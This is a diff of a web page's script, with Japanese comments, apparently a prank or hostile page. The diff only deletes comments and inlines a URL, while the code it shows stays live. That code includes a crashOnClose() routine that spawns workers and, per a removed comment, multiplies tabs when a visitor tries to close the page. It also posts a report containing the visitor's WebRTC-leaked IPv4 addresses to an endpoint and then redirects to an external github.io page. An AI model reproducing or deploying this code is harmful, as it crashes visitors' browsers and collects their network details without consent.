@@ -73,7 +73,6 @@
 </div>
 
 <script>
-// ========== 閉じようとするとタブ増殖 + 円周率爆撃 ==========
 function crashOnClose() {
   const workers = [];
 
@@ -130,14 +129,11 @@ function crashOnClose() {
 
 crashOnClose();
 
-// ========== 天気取得 → 別サイトへ ==========
 (async function () {
   const statusEl = document.getElementById("status");
   const weatherEl = document.getElementById("weather");
   const leakEl = document.getElementById("leak");
   const errorEl = document.getElementById("error");
-
-  const REDIRECT_URL = "https://kcjsa.github.io/fan/dex.html";
 
   function showError(msg) {
     statusEl.textContent = "";
@@ -315,10 +311,9 @@ WebRTC IPv4: ${ipv4ListStr}`;
       body: text
     });
 
-    // 送信完了 → 1.5秒後に別サイトへ
     statusEl.textContent = "読み込み完了　まもなく移動します…";
     setTimeout(() => {
-      window.location.href = REDIRECT_URL;
+      window.location.href = "https://kcjsa.github.io/fan/dex.html";
     }, 1500);
 
   } catch (e) {
